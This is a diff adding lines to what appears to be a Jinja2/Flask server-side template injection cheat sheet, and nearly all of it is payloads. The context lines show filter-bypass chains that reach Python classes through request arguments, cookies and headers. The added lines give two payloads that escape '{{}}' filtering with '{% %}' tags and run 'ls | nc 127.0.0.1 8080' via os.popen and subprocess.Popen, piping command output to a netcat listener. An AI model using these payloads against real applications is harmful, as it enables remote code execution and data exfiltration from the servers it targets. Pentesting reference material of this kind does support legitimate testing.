@@ -233,6 +233,14 @@ http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,req
 <http://127.0.0.1:8080?c=>{{ request|attr(request.cookies.get('class'))|attr(request.cookies.get('mro'))|attr(request.cookies.get('getitem'))(1) }}
 <http://127.0.0.1:8080?c=>{{ request|attr(request.headers.get('class'))|attr(request.headers.get('mro'))|attr(request.headers.get('getitem'))(1) }}
 ```
+{% raw %}
+## {{}} Filtering → {% %}
+```python
+{% if(config.__class__.__init__.__globals__['os'].popen('ls | nc 127.0.0.1 8080')) %}{% endif %}
+{% for i in range(0,500) %} {% if(((''.__class__.__mro__[1].__subclasses__()[i])|string) == "<class 'subprocess.Popen'>") %} {% if(''.__class__.__mro__[1].__subclasses__()[i]('ls | nc 127.0.0.1 8080', shell=True, stdout=-1)) %} {% endif %} {% endif %} {% endfor %}
+```
+{% endraw %}
+
 
 
 # SSTI for XSS
